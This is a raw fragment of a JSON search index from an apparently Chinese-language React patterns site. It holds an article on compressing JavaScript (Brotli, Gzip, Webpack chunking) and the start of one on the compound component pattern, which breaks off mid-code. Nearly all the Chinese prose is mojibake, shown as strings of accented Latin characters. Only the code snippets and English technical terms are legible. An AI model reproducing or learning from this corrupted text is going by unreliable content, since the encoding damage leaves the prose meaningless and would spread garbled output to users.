å¯¹äºæ‰€æœ‰åŒ…å¤§å°ï¼Œç®—æ³•ä¹‹é—´çš„å…³ç³»éƒ½æ˜¯ç›¸ä¼¼çš„ï¼ˆä¾‹å¦‚ï¼Œå¯¹äºæ¯ä¸ªåŒ…å¤§å°ï¼ŒBrotli 7 éƒ½ä¼˜äº Gzip 9ï¼Œå¯¹äºæ‰€æœ‰å¤§å°èŒƒå›´ï¼ŒGzip 9 éƒ½æ¯” Brotli 5 å¿«ï¼‰ã€‚\n  ç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹æœåŠ¡å™¨å’Œæµè§ˆå™¨ä¹‹é—´å…³äºæ‰€é€‰å‹ç¼©æ ¼å¼çš„é€šä¿¡ã€‚\n\rå¯ç”¨å‹ç¼© å¯ä»¥åœ¨æ„å»ºè¿‡ç¨‹ä¸­å¯ç”¨é™æ€å‹ç¼©ã€‚\nå¦‚æœä½¿ç”¨ Webpack æ¥æ†ç»‘æ‚¨çš„ä»£ç ï¼Œå¯ä»¥ä½¿ç”¨ CompressionPlugin è¿›è¡Œ Gzip å‹ç¼©æˆ–ä½¿ç”¨ BrotliWebpackPlugin è¿›è¡Œ Brotli å‹ç¼©ã€‚\nè¯¥æ’ä»¶å¯ä»¥åŒ…å«åœ¨ Webpack é…ç½®æ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\nmodule.exports = {\r//...\rplugins: [\r//...\rnew CompressionPlugin()\r]\r} Next.js é»˜è®¤æä¾› Gzip å‹ç¼©ï¼Œä½†å»ºè®®åœ¨åƒ Nginx è¿™æ ·çš„ HTTP ä»£ç†ä¸Šå¯ç”¨å®ƒã€‚\nVercel å¹³å°åœ¨ä»£ç†çº§åˆ«æ”¯æŒ Gzip å’Œ Brotliã€‚\nå¯ä»¥åœ¨æ”¯æŒä¸åŒå‹ç¼©ç®—æ³•çš„æœåŠ¡å™¨ï¼ˆåŒ…æ‹¬ Node.jsï¼‰ä¸Šå¯ç”¨åŠ¨æ€æ— æŸå‹ç¼©ã€‚\næµè§ˆå™¨é€šè¿‡è¯·æ±‚ä¸­çš„ Accept-Encoding HTTP æ ‡å¤´ä¼ è¾¾å®ƒæ”¯æŒçš„å‹ç¼©ç®—æ³•ã€‚ ä¾‹å¦‚ï¼Œ\nAccept-Encoding: gzip, br è¿™è¡¨æ˜æµè§ˆå™¨æ”¯æŒ Gzip å’Œ Brotliã€‚\nå¯ä»¥æŒ‰ç…§ç‰¹å®šæœåŠ¡å™¨ç±»å‹çš„è¯´æ˜åœ¨æœåŠ¡å™¨ä¸Šå¯ç”¨ä¸åŒç±»å‹çš„å‹ç¼©ã€‚\nä¾‹å¦‚ï¼Œå¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°åœ¨ Apache æœåŠ¡å™¨ä¸Šå¯ç”¨ Brotli çš„è¯´æ˜ã€‚\nExpress æ˜¯ä¸€ä¸ªæµè¡Œçš„ Node ç½‘ç»œæ¡†æ¶ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªå‹ç¼©ä¸­é—´ä»¶åº“ã€‚\nä½¿ç”¨å®ƒæ¥åœ¨è¯·æ±‚æ—¶å‹ç¼©ä»»ä½•èµ„äº§ã€‚\nBrotli æ¯”å…¶ä»–å‹ç¼©ç®—æ³•æ›´å—æ¨èï¼Œå› ä¸ºå®ƒç”Ÿæˆçš„æ–‡ä»¶æ›´å°ã€‚\nå¯¹äºä¸æ”¯æŒ Brotli çš„æµè§ˆå™¨ï¼Œå¯ä»¥å¯ç”¨ Gzip ä½œä¸ºåå¤‡ã€‚ å¦‚æœé…ç½®æˆåŠŸï¼ŒæœåŠ¡å™¨å°†è¿”å› Content-Encoding HTTP å“åº”å¤´ä»¥æŒ‡ç¤ºå“åº”ä¸­ä½¿ç”¨çš„å‹ç¼©ç®—æ³•ã€‚ ä¾‹å¦‚ï¼Œ\nContent-Encoding: br \rå®¡è®¡å‹ç¼© å¯ä»¥åœ¨ Chrome -\u0026gt; DevTools -\u0026gt; network -\u0026gt; Headers ä¸­æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å‹ç¼©äº†ä¸‹è½½çš„è„šæœ¬æˆ–æ–‡æœ¬ã€‚\nDevTools æ˜¾ç¤ºå“åº”ä¸­ä½¿ç”¨çš„å†…å®¹ç¼–ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\nLighthouse æŠ¥å‘ŠåŒ…æ‹¬å¯¹â€œå¯ç”¨æ–‡æœ¬å‹ç¼©â€çš„æ€§èƒ½å®¡è®¡ï¼Œè¯¥å®¡è®¡æ£€æŸ¥æ¥æ”¶åˆ°çš„åŸºäºæ–‡æœ¬çš„èµ„æºç±»å‹ï¼Œè€Œå†…å®¹ç¼–ç æ ‡å¤´æœªè®¾ç½®ä¸ºâ€œbrâ€ã€â€œgzipâ€æˆ–â€œdeflateâ€ã€‚\nLighthouse ä½¿ç”¨ Gzip æ¥è®¡ç®—èµ„æºçš„æ½œåœ¨èŠ‚çœã€‚\n\rJavaScript å‹ç¼©å’ŒåŠ è½½ç²’åº¦ è¦å…¨é¢æŒæ¡ JavaScript å‹ç¼©çš„æ•ˆæœï¼Œè¿˜å¿…é¡»è€ƒè™‘ JavaScript ä¼˜åŒ–çš„å…¶ä»–æ–¹é¢ï¼Œä¾‹å¦‚åŸºäºè·¯ç”±çš„æ‹†åˆ†ã€ä»£ç æ‹†åˆ†å’Œæ†ç»‘ã€‚\nå…·æœ‰å¤§é‡ JavaScript ä»£ç çš„ç°ä»£ Web åº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨ä¸åŒçš„ä»£ç æ‹†åˆ†å’Œæ†ç»‘æŠ€æœ¯æ¥æœ‰æ•ˆåœ°åŠ è½½ä»£ç ã€‚\nåº”ç”¨ç¨‹åºä½¿ç”¨é€»è¾‘è¾¹ç•Œæ¥æ‹†åˆ†ä»£ç ï¼Œä¾‹å¦‚å•é¡µåº”ç”¨ç¨‹åºçš„è·¯ç”±çº§åˆ«æ‹†åˆ†æˆ–åœ¨äº¤äº’æˆ–è§†å£å¯è§æ€§ä¸Šå¢é‡åœ°æä¾› JavaScriptã€‚ å¯ä»¥é…ç½®æ†ç»‘å™¨ä»¥è¯†åˆ«è¿™äº›è¾¹ç•Œã€‚\nåœ¨ç»§ç»­è®¨è®ºè¿™å¦‚ä½•å½±å“å‹ç¼©ä¹‹å‰ï¼Œå…ˆä»‹ç»ä¸€äº›ä¸ä»£ç æ‹†åˆ†å’Œæ†ç»‘ç›¸å…³çš„åŸºæœ¬å®šä¹‰ã€‚\n\ræ†ç»‘æœ¯è¯­ ä»¥ä¸‹æ˜¯ä¸æˆ‘ä»¬çš„è®¨è®ºç›¸å…³çš„ä¸€äº›å…³é”®æœ¯è¯­ã€‚\n  Moduleï¼šæ¨¡å—æ˜¯ç¦»æ•£çš„åŠŸèƒ½å—ï¼Œæ—¨åœ¨æä¾›å¯é çš„æŠ½è±¡å’Œå°è£…ã€‚ æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…æ¨¡å—æ¨¡å¼ã€‚\n  Bundleï¼šä¸€ç»„ä¸åŒçš„æ¨¡å—ï¼ŒåŒ…å«æºæ–‡ä»¶çš„æœ€ç»ˆç‰ˆæœ¬ï¼Œå¹¶ä¸”å·²ç»åœ¨æ‰“åŒ…å™¨ä¸­è¿›è¡Œäº†åŠ è½½å’Œç¼–è¯‘è¿‡ç¨‹ã€‚\n  Bundle splittingï¼šæ†ç»‘å™¨ä½¿ç”¨çš„è¿‡ç¨‹å°†åº”ç”¨ç¨‹åºæ‹†åˆ†ä¸ºå¤šä¸ªæ†ç»‘åŒ…ï¼Œä»¥ä¾¿æ¯ä¸ªæ†ç»‘åŒ…éƒ½å¯ä»¥ç‹¬ç«‹ã€å‘å¸ƒã€ä¸‹è½½æˆ–ç¼“å­˜ã€‚\n  chunkï¼šä» Webpack æœ¯è¯­ä¸­é‡‡ç”¨ï¼Œå—æ˜¯æ†ç»‘å’Œä»£ç æ‹†åˆ†è¿‡ç¨‹çš„æœ€ç»ˆè¾“å‡ºã€‚ Webpack å¯ä»¥æ ¹æ®å…¥å£é…ç½®ã€SplitChunksPlugin æˆ–åŠ¨æ€å¯¼å…¥å°†åŒ…æ‹†åˆ†ä¸ºå—ã€‚\n  å¦‚æœæ¨¡å—åŒ…å«åœ¨æºæ–‡ä»¶ä¸­ï¼Œåˆ™åœ¨ä»£ç æˆ–åŒ…æ‹†åˆ†åæ„å»ºè¿‡ç¨‹çš„æœ€ç»ˆè¾“å‡ºç§°ä¸º chunkã€‚ è¯·æ³¨æ„ï¼Œæºæ–‡ä»¶å’Œ chunk å¯èƒ½ç›¸äº’ä¾èµ–ã€‚\nJavaScript çš„è¾“å‡ºå¤§å°æ˜¯æŒ‡ç»è¿‡ JavaScript æ‰“åŒ…å™¨æˆ–ç¼–è¯‘å™¨ä¼˜åŒ–åçš„å—å¤§å°æˆ–åŸå§‹å¤§å°ã€‚\nå¤§å‹ JS åº”ç”¨ç¨‹åºå¯ä»¥è§£æ„ä¸ºå¯ç‹¬ç«‹åŠ è½½çš„ JavaScript æ–‡ä»¶å—ã€‚\nåŠ è½½ç²’åº¦æ˜¯æŒ‡è¾“å‡ºå—çš„æ•°é‡â€”â€”å—çš„æ•°é‡è¶Šå¤šï¼Œæ¯ä¸ªå—çš„å¤§å°è¶Šå°ï¼Œç²’åº¦è¶Šé«˜ã€‚\nä¸€äº›å—æ¯”å…¶ä»–å—æ›´é‡è¦ï¼Œå› ä¸ºå®ƒä»¬åŠ è½½æ›´é¢‘ç¹æˆ–è€…æ˜¯æ›´æœ‰å½±å“åŠ›çš„ä»£ç è·¯å¾„çš„ä¸€éƒ¨åˆ†ï¼ˆä¾‹å¦‚ï¼ŒåŠ è½½â€œç»“å¸â€å°éƒ¨ä»¶ï¼‰ã€‚\nçŸ¥é“å“ªäº›å—æœ€é‡è¦éœ€è¦åº”ç”¨çŸ¥è¯†ï¼Œå°½ç®¡å¯ä»¥å®‰å…¨åœ°å‡è®¾â€œåŸºæœ¬â€å—æ€»æ˜¯å¿…ä¸å¯å°‘çš„ã€‚\né¡µé¢æ‰€éœ€çš„å—çš„æ¯ä¸ªå­—èŠ‚éƒ½éœ€è¦ç”±ç”¨æˆ·è®¾å¤‡ä¸‹è½½å’Œè§£æ/æ‰§è¡Œã€‚\nè¿™æ˜¯ç›´æ¥å½±å“åº”ç”¨ç¨‹åºæ€§èƒ½çš„ä»£ç ã€‚ç”±äºå—æ˜¯æœ€ç»ˆå°†è¢«ä¸‹è½½çš„ä»£ç ï¼Œå› æ­¤å‹ç¼©å—å¯ä»¥æé«˜ä¸‹è½½é€Ÿåº¦ã€‚\nåœ¨æ­¤èƒŒæ™¯ä¸‹ï¼Œè®©æˆ‘ä»¬è®¨è®ºåŠ è½½ç²’åº¦å’Œå‹ç¼©ä¹‹é—´çš„ç›¸äº’ä½œç”¨ã€‚\n\rç²’åº¦æƒè¡¡ åœ¨ç†æƒ³çš„ä¸–ç•Œä¸­ï¼Œç²’åº¦å’Œåˆ†å—ç­–ç•¥åº”æ—¨åœ¨å®ç°ä»¥ä¸‹ç›¸äº’çŸ›ç›¾çš„ç›®æ ‡ã€‚\n æé«˜ä¸‹è½½é€Ÿåº¦ï¼š  å¦‚å‰å‡ èŠ‚æ‰€ç¤ºï¼Œå¯ä»¥ä½¿ç”¨å‹ç¼©æ¥æé«˜ä¸‹è½½é€Ÿåº¦ã€‚ ä½†æ˜¯ï¼Œä¸ä½¿ç”¨ç›¸åŒçš„ä»£ç å‹ç¼©å¤šä¸ªå°å—ç›¸æ¯”ï¼Œå‹ç¼©ä¸€ä¸ªå¤§å—ä¼šäº§ç”Ÿæ›´å¥½çš„ç»“æœæˆ–æ›´å°çš„æ–‡ä»¶å¤§å°ã€‚\ncompress(a + b) \u0026lt;= compress(a) + compress(b)\n mited æœ¬åœ°æ•°æ®è¡¨æ˜è¾ƒå°å—çš„æŸå¤±ä¸º 5% åˆ° 10%ã€‚ éæ†ç»‘å—çš„æç«¯æƒ…å†µæ˜¾ç¤ºå¤§å°å¢åŠ äº† 20%ã€‚ é¢å¤–çš„ IPCã€I/O å’Œå¤„ç†æˆæœ¬é™„åŠ åˆ°åœ¨è¾ƒå¤§å—çš„æƒ…å†µä¸‹å…±äº«çš„æ¯ä¸ªå—ã€‚ v8 å¼•æ“å…·æœ‰ 30K æµ/è§£æé˜ˆå€¼ã€‚ è¿™æ„å‘³ç€æ‰€æœ‰å°äº 30K çš„å—éƒ½ä¼šåœ¨å…³é”®åŠ è½½è·¯å¾„ä¸Šè§£æï¼Œå³ä½¿å®ƒæ˜¯éå…³é”®çš„ã€‚\n  ç”±äºä¸Šè¿°åŸå› ï¼Œå¯¹äºä¼˜åŒ–ä¸‹è½½å’Œæµè§ˆå™¨æ€§èƒ½çš„ç›¸åŒä»£ç ï¼Œè¾ƒå¤§çš„å—å¯èƒ½æ¯”è¾ƒå°çš„å—æ›´æœ‰æ•ˆã€‚\n æé«˜ç¼“å­˜å‘½ä¸­ç‡å’Œç¼“å­˜æ•ˆç‡ï¼šè¾ƒå°çš„å—å¯¼è‡´æ›´å¥½çš„ç¼“å­˜æ•ˆç‡ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå¢é‡åŠ è½½ JS çš„åº”ç”¨ç¨‹åºã€‚    æ›´æ”¹è¢«éš”ç¦»åˆ°å…·æœ‰è¾ƒå°å—çš„è¾ƒå°‘å—ä¸­ã€‚ å¦‚æœæœ‰ä»£ç å˜åŒ–ï¼Œåªéœ€è¦é‡æ–°ä¸‹è½½å—å½±å“çš„chunkï¼Œè€Œè¿™äº›å¯¹åº”çš„ä»£ç å¤§å°å¾ˆå¯èƒ½å¾ˆå°ã€‚ å‰©ä½™çš„å—å¯ä»¥åœ¨ç¼“å­˜ä¸­æ‰¾åˆ°ï¼Œä»è€Œå¢åŠ ç¼“å­˜å‘½ä¸­çš„æ¬¡æ•°ã€‚\n  å¯¹äºè¾ƒå¤§çš„å—ï¼Œå¾ˆå¯èƒ½ä¼šå½±å“è¾ƒå¤§çš„ä»£ç ï¼Œå¹¶éœ€è¦åœ¨ä»£ç æ›´æ”¹åé‡æ–°ä¸‹è½½ã€‚\nå› æ­¤ï¼Œå¸Œæœ›ä½¿ç”¨æ›´å°çš„å—æ¥åˆ©ç”¨ç¼“å­˜æœºåˆ¶ã€‚\n  æ‰§è¡Œå¿« - å¯¹äºå¿«é€Ÿæ‰§è¡Œçš„ä»£ç ï¼Œå®ƒåº”è¯¥æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ã€‚    æ‰€æœ‰å¿…éœ€çš„ä¾èµ–é¡¹éƒ½å¾ˆå®¹æ˜“è·å¾— - å®ƒä»¬å·²ç»ä¸€èµ·ä¸‹è½½æˆ–åœ¨ç¼“å­˜ä¸­å¯ç”¨ã€‚ è¿™æ„å‘³ç€æ‚¨åº”è¯¥å°†æ‰€æœ‰ç›¸å…³ä»£ç æ†ç»‘åœ¨ä¸€èµ·ä½œä¸ºä¸€ä¸ªæ›´å¤§çš„å—ã€‚\n  åªæœ‰é¡µé¢/è·¯ç”±æ‰€éœ€çš„ä»£ç æ‰èƒ½æ‰§è¡Œã€‚ è¿™è¦æ±‚ä¸ä¸‹è½½æˆ–æ‰§è¡Œé¢å¤–çš„ä»£ç ã€‚ åŒ…å«å…¬å…±ä¾èµ–é¡¹çš„å…¬å…±å—å¯èƒ½å…·æœ‰å¤§å¤šæ•°ä½†ä¸æ˜¯æ‰€æœ‰é¡µé¢æ‰€éœ€çš„ä¾èµ–é¡¹ã€‚ é‡å¤ä»£ç åˆ é™¤éœ€è¦è¾ƒå°çš„ç‹¬ç«‹å—ã€‚\n  ä¸»çº¿ç¨‹ä¸Šçš„é•¿ä»»åŠ¡ä¼šé˜»å¡å¾ˆé•¿æ—¶é—´ã€‚ å› æ­¤ï¼Œè¿™äº›éœ€è¦åˆ†è§£æˆæ›´å°çš„å—ã€‚\n  å¦‚ä¸Šé¢çš„ä¸‰è§’å½¢æ‰€ç¤ºï¼Œå°è¯•ä¼˜åŒ–ä¸Šè¿°ç›®æ ‡ä¹‹ä¸€çš„åŠ è½½ç²’åº¦å¯èƒ½ä¼šä½¿æ‚¨è¿œç¦»å…¶ä»–ç›®æ ‡ã€‚ è¿™å°±æ˜¯ç²’åº¦æƒè¡¡çš„é—®é¢˜\né‡å¤æ•°æ®åˆ é™¤å’Œç¼“å­˜ä¸æµè§ˆå™¨æ€§èƒ½å’Œå‹ç¼©ä¸ä¸€è‡´ã€‚\nç”±äºè¿™ç§æƒè¡¡ï¼Œå½“ä»Šå¤§å¤šæ•°ç”Ÿäº§åº”ç”¨ç¨‹åºä½¿ç”¨çš„æœ€å¤§å—æ•°çº¦ä¸º 10ã€‚\néœ€è¦å¢åŠ æ­¤é™åˆ¶ä»¥æ”¯æŒå¯¹å…·æœ‰å¤§é‡ JavaScript çš„åº”ç”¨ç¨‹åºæ›´å¥½çš„ç¼“å­˜å’Œé‡å¤æ•°æ®åˆ é™¤ã€‚\n\rSplitChunksPlugin å’Œ Granular chunking ç²’åº¦æƒè¡¡çš„æ½œåœ¨è§£å†³æ–¹æ¡ˆå°†æ»¡è¶³ä»¥ä¸‹è¦æ±‚ã€‚\n  å…è®¸ä½¿ç”¨æ›´å°å—å¤§å°çš„æ›´å¤šå—ï¼ˆ40 åˆ° 100ï¼‰ï¼Œä»¥ä¾¿åœ¨ä¸å½±å“æ€§èƒ½çš„æƒ…å†µä¸‹å®ç°æ›´å¥½çš„ç¼“å­˜å’Œé‡å¤æ•°æ®åˆ é™¤ã€‚\n  ç”±äº IPCã€I/O å’Œè®¸å¤šè„šæœ¬æ ‡ç­¾çš„å¤„ç†æˆæœ¬ï¼Œè§£å†³äº†å¤šä¸ªè¾ƒå°å—çš„æ€§èƒ½å¼€é”€ã€‚\n  åœ¨å¤šä¸ªè¾ƒå°å—çš„æƒ…å†µä¸‹è§£å†³å‹ç¼©æŸå¤±ã€‚\n  æ»¡è¶³è¿™äº›è¦æ±‚çš„æ½œåœ¨è§£å†³æ–¹æ¡ˆä»åœ¨å¼€å‘ä¸­ã€‚ ä½†æ˜¯ï¼ŒWebpack v4 çš„ SplitChunksPlugin å’Œç²’åº¦åˆ†å—ç­–ç•¥å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¸®åŠ©æé«˜åŠ è½½ç²’åº¦ã€‚\næ—©æœŸç‰ˆæœ¬çš„ Webpack ä½¿ç”¨ CommonsChunkPlugin å°†å…¬å…±ä¾èµ–é¡¹æˆ–å…±äº«æ¨¡å—æ†ç»‘åˆ°å•ä¸ªå—ä¸­ã€‚ å¯¹äºä¸ä½¿ç”¨è¿™äº›é€šç”¨æ¨¡å—çš„é¡µé¢ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ä¸å¿…è¦çš„ä¸‹è½½å’Œæ‰§è¡Œæ—¶é—´å¢åŠ ã€‚ ä¸ºäº†æ›´å¥½åœ°ä¼˜åŒ–æ­¤ç±»é¡µé¢ï¼ŒWebpack åœ¨ v4 ä¸­å¼•å…¥äº† SplitChunksPluginã€‚ æ ¹æ®é»˜è®¤å€¼æˆ–é…ç½®åˆ›å»ºå¤šä¸ªæ‹†åˆ†å—ï¼Œä»¥é˜²æ­¢è·¨å„ç§è·¯ç”±è·å–é‡å¤ä»£ç ã€‚\nNext.js é‡‡ç”¨äº† SplitChunksPlugin å¹¶å®ç°äº†ä»¥ä¸‹ç²’åº¦åˆ†å—ç­–ç•¥æ¥ç”Ÿæˆè§£å†³ç²’åº¦æƒè¡¡çš„ Webpack å—ã€‚\n  ä»»ä½•è¶³å¤Ÿå¤§çš„ç¬¬ä¸‰æ–¹æ¨¡å—ï¼ˆå¤§äº 160 KBï¼‰éƒ½è¢«åˆ†æˆä¸€ä¸ªå•ç‹¬çš„å—ã€‚\n  ä¸ºæ¡†æ¶ä¾èµ–é¡¹åˆ›å»ºäº†ä¸€ä¸ªå•ç‹¬çš„æ¡†æ¶å—ã€‚ (reactã€react-dom ç­‰ç­‰)\n  æ ¹æ®éœ€è¦åˆ›å»ºå°½å¯èƒ½å¤šçš„å…±äº«å—ã€‚ ï¼ˆæœ€å¤š 25 ä¸ªï¼‰\n  è¦ç”Ÿæˆçš„å—çš„æœ€å°å¤§å°æ›´æ”¹ä¸º 20 KBã€‚\n  å‘å‡ºå¤šä¸ªå…±äº«å—è€Œä¸æ˜¯å•ä¸ªå—å¯ä»¥æœ€å¤§é™åº¦åœ°å‡å°‘åœ¨ä¸åŒé¡µé¢ä¸Šä¸‹è½½æˆ–æ‰§è¡Œçš„ä¸å¿…è¦ï¼ˆæˆ–é‡å¤ï¼‰ä»£ç çš„æ•°é‡ã€‚ ä¸ºå¤§å‹ç¬¬ä¸‰æ–¹åº“ç”Ÿæˆç‹¬ç«‹çš„å—å¯ä»¥æ”¹è¿›ç¼“å­˜ï¼Œå› ä¸ºå®ƒä»¬ä¸å¤ªå¯èƒ½ç»å¸¸æ›´æ”¹ã€‚ 20 kB çš„æœ€å°å—å¤§å°å¯ç¡®ä¿å‹ç¼©æŸå¤±ç›¸å½“ä½ã€‚\nç²’åº¦åˆ†å—ç­–ç•¥å¸®åŠ©å‡ ä¸ª Next JS åº”ç”¨ç¨‹åºå‡å°‘äº†ç«™ç‚¹ä½¿ç”¨çš„ JavaScript æ€»é‡ã€‚\nåœ¨ Gatsby ä¸­ä¹Ÿå®æ–½äº†ç²’åº¦åˆ†å—ç­–ç•¥ï¼Œå¹¶è§‚å¯Ÿåˆ°äº†ç±»ä¼¼çš„å¥½å¤„ã€‚\n\ræ€»ç»“ ä»…é å‹ç¼©å¹¶ä¸èƒ½è§£å†³æ‰€æœ‰ JavaScript æ€§èƒ½é—®é¢˜ï¼Œ\nä½†äº†è§£æµè§ˆå™¨å’Œæ‰“åŒ…å™¨åœ¨å¹•åçš„å·¥ä½œæ–¹å¼æœ‰åŠ©äºåˆ›å»ºæ›´å¥½çš„æ‰“åŒ…ç­–ç•¥ï¼Œä»¥æ”¯æŒæ›´å¥½çš„å‹ç¼©ã€‚\nåŠ è½½ç²’åº¦é—®é¢˜éœ€è¦è·¨ç”Ÿæ€ç³»ç»Ÿä¸­çš„ä¸åŒå¹³å°è§£å†³ã€‚\nç²’åº¦åˆ†å—å¯èƒ½æ˜¯æœç€è¿™ä¸ªæ–¹å‘è¿ˆå‡ºçš„ä¸€æ­¥ï¼Œä½†æˆ‘ä»¬è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ã€‚\n\rçŸ¥è¯†ç‚¹    ","description":"å‡å°‘é€šè¿‡ç½‘ç»œä¼ è¾“è„šæœ¬æ‰€éœ€çš„æ—¶é—´","id":133,"section":"react-patterns","tags":null,"title":"å‹ç¼© JavaScript","uri":"https://codthing.github.io/react-patterns/performance-patterns/%E5%8E%8B%E7%BC%A9-javascript/"},{"content":"åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œç»å¸¸æœ‰å±äºå½¼æ­¤çš„ç»„ä»¶ã€‚\nå®ƒä»¬é€šè¿‡å…±äº«çŠ¶æ€ç›¸äº’ä¾èµ–ï¼Œå¹¶å…±äº«é€»è¾‘ã€‚\nç»å¸¸ä¼šåœ¨é€‰æ‹©ã€ä¸‹æ‹‰ç»„ä»¶æˆ–èœå•é¡¹ç­‰ç»„ä»¶ä¸­çœ‹åˆ°è¿™ä¸€ç‚¹ã€‚\nå¤åˆç»„ä»¶æ¨¡å¼å…è®¸åˆ›å»ºæ‰€æœ‰ä¸€èµ·å·¥ä½œä»¥æ‰§è¡Œä»»åŠ¡çš„ç»„ä»¶ã€‚\n\rContext API è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼š\næˆ‘ä»¬æœ‰ä¸€ä¸ªæ¾é¼ å›¾åƒåˆ—è¡¨ï¼ é™¤äº†åªæ˜¾ç¤ºæ¾é¼ å›¾åƒä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜æƒ³æ·»åŠ ä¸€ä¸ªæŒ‰é’®ï¼Œä½¿ç”¨æˆ·å¯ä»¥ç¼–è¾‘æˆ–åˆ é™¤å›¾åƒã€‚\næˆ‘ä»¬å¯ä»¥å®ç°ä¸€ä¸ª FlyOut ç»„ä»¶ï¼Œå½“ç”¨æˆ·åˆ‡æ¢ç»„ä»¶æ—¶æ˜¾ç¤ºä¸€ä¸ªåˆ—è¡¨ã€‚\nåœ¨ FlyOut ç»„ä»¶ä¸­ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šæ‹¥æœ‰ä¸‰æ ·ä¸œè¥¿ï¼š\n FlyOut åŒ…è£…å™¨ï¼Œå…¶ä¸­åŒ…å«åˆ‡æ¢æŒ‰é’®å’Œåˆ—è¡¨ Toggle æŒ‰é’®ï¼Œç”¨äºåˆ‡æ¢åˆ—è¡¨ List ï¼Œå…¶ä¸­åŒ…å«èœå•é¡¹åˆ—è¡¨  ä½¿ç”¨å¤åˆç»„ä»¶æ¨¡å¼å’Œ React çš„ Context API éå¸¸é€‚åˆè¿™ä¸ªä¾‹å­ï¼\né¦–å…ˆï¼Œè®©æˆ‘ä»¬åˆ›å»º FlyOut ç»„ä»¶ã€‚ è¯¥ç»„ä»¶ä¿æŒçŠ¶æ€ï¼Œå¹¶å°†å¸¦æœ‰åˆ‡æ¢å€¼çš„ FlyOutProvider è¿”å›ç»™å®ƒæ¥æ”¶åˆ°çš„æ‰€æœ‰å­é¡¹ã€‚\nconst FlyOutContext = createContext();\rfunction FlyOut(props) {\rconst [open, toggle] = useState(false);\rconst providerValue = { open, toggle };\rreturn (\r\u0026lt;FlyOutContext.Provider value={providerValue}\u0026gt;\r{props.children}\r\u0026lt;/FlyOutContext.Provider\u0026gt;\r);\r} æˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªæœ‰çŠ¶æ€çš„ FlyOut ç»„ä»¶ï¼Œå¯ä»¥å°† open å’Œ toggle çš„å€¼ä¼ é€’ç»™å®ƒçš„å­©å­ï¼\nè®©æˆ‘ä»¬åˆ›å»º Toggle ç»„ä»¶ã€‚ è¯¥ç»„ä»¶åªæ˜¯å‘ˆç°ç”¨æˆ·å¯ä»¥å•å‡»ä»¥åˆ‡æ¢èœå•çš„ç»„ä»¶ã€‚\nfunction Toggle() {\rconst { open, toggle } = useContext(FlyOutContext);\rreturn (\r\u0026lt;div onClick={() =\u0026gt; toggle(!open)}\u0026gt;\r\u0026lt;Icon /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} ä¸ºäº†çœŸæ­£è®© Toggle è®¿é—® FlyOutContext æä¾›è€…ï¼Œæˆ‘ä»¬éœ€è¦å°†å®ƒå‘ˆç°ä¸º FlyOut çš„å­ç»„ä»¶ï¼\næˆ‘ä»¬å¯ä»¥ç®€å•åœ°å°†å…¶æ¸²æŸ“ä¸ºå­ç»„ä»¶ã€‚\nç„¶è€Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è®© Toggle ç»„ä»¶æˆä¸º FlyOut ç»„ä»¶çš„ä¸€ä¸ªå±æ€§ï¼\nconst FlyOutContext = createContext();\rfunction FlyOut(props) {\rconst [open, toggle] = useState(false);\rreturn (\r\u0026lt;FlyOutContext.Provider value={{ open, toggle }}\u0026gt;\r{props.children}\r\u0026lt;/FlyOutContext.Provider\u0026gt;\r);\r}\rfunction Toggle() {\rconst { open, toggle } = useContext(FlyOutContext);\rreturn (\r\u0026lt;div onClick={() =\u0026gt; toggle(!open)}\u0026gt;\r\u0026lt;Icon /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rFlyOut.Toggle = Toggle; è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬æƒ³åœ¨ä»»ä½•æ–‡ä»¶ä¸­ä½¿ç”¨ FlyOut ç»„ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦å¯¼å…¥ FlyOutï¼\nimport React from \u0026#34;react\u0026#34;;\rimport { FlyOut } from \u0026#34;./FlyOut\u0026#34;;\rexport default function FlyoutMenu() {\rreturn (\r\u0026lt;FlyOut\u0026gt;\r\u0026lt;FlyOut.Toggle /\u0026gt;\r\u0026lt;/FlyOut\u0026gt;\r);\r} ä»…ä»…åˆ‡æ¢æ˜¯ä¸å¤Ÿçš„ã€‚ æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªåŒ…å«åˆ—è¡¨é¡¹çš„ Listï¼Œå®ƒæ ¹æ® open çš„å€¼æ‰“å¼€å’Œå…³é—­ã€‚\nfunction List({ children }) {\rconst { open } = React.useContext(FlyOutContext);\rreturn open \u0026amp;\u0026amp; \u0026lt;ul\u0026gt;{children}\u0026lt;/ul\u0026gt;;\r}\rfunction Item({ children }) {\rreturn \u0026lt;li\u0026gt;{children}\u0026lt;/li\u0026gt;;\r} List ç»„ä»¶æ ¹æ® open çš„å€¼æ˜¯ true è¿˜æ˜¯ false å‘ˆç°å…¶å­é¡¹ã€‚\nè®©æˆ‘ä»¬å°† List å’Œ Item ä½œä¸º FlyOut ç»„ä»¶çš„å±æ€§ï¼Œå°±åƒæˆ‘ä»¬å¯¹ Toggle ç»„ä»¶æ‰€åšçš„é‚£æ ·ã€‚\nconst FlyOutContext = createContext();\rfunction FlyOut(props) {\rconst [open, toggle] = useState(false);\rreturn (\r\u0026lt;FlyOutContext.Provider value={{ open, toggle }}\u0026gt;\r{props.children}\r\u0026lt;/FlyOutContext.Provider\u0026gt;\r);\r}\rfunction Toggle() {\rconst { open, toggle } = useContext(FlyOutContext);\rreturn (\r\u0026lt;div onClick={() =\u0026gt; 